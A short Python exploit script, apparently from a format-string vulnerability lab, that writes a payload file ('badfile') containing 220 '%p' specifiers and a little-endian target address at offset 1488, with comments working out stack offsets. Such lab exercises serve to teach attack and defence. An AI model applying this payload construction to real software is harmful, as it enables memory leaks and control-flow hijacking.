#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))
# This line shows how to store a 4-byte integer at offset 0
number  = 0x0000555555556008 #0x080b4008 0xbfffeeee
content[1488:1496]  =  (number).to_bytes(8,byteorder='little')
#1500 is not divisible by 8 if we check for offet by 1500 we cut the adress in half
# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("@@@@").encode('latin-1')

# This line shows how to construct a string s with
#  s% and offset between print and our buffer we go to the start of the buffer.
s="%p"* 220
#offset is 219
# this writes the first count to the first address and the next

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[0:0+len(fmt)] = fmt
#we are putting format string at the bottom of the buffer
# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
